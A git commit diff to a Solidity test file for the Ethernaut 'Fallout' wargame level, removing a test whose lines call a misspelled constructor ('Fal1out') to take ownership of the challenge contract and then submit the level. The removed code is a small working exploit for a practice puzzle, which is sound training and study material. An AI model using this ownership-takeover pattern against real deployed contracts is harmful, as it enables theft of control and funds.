097fbfb3ce147e8dd20b1b84e499f87858cbb821
Mis4nthr0pic <121455563+Mis4nthr0pic@users.noreply.github.com>
2023-07-07 21:31:20 -0300

    Update Fallout.t.sol

--- src/test/Fallout.t.sol
+++ src/test/Fallout.t.sol
@@ -18,31 +18,6 @@ contract FalloutTest is DSTest {
     }
 
     function testFalloutHack() public {
-        /////////////////
-        // LEVEL SETUP //
-        /////////////////
-
-        FalloutFactory falloutFactory = new FalloutFactory();
-        ethernaut.registerLevel(falloutFactory);
-        vm.startPrank(eoaAddress);
-        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
-        Fallout ethernautFallout = Fallout(payable(levelAddress));
-
-        //////////////////
-        // LEVEL ATTACK //
-        //////////////////
-
-        // Call Fal1out constructor function with some value, mispelling enables us to call it - log owner before and after  
-        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.owner());
-        ethernautFallout.Fal1out{value: 1 wei}();
-        emit log_named_address("Fallout Owner After Attack", ethernautFallout.owner());
-
-        //////////////////////
-        // LEVEL SUBMISSION //
-        //////////////////////
-
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
-        vm.stopPrank();
-        assert(levelSuccessfullyPassed);
+     
     }
 }
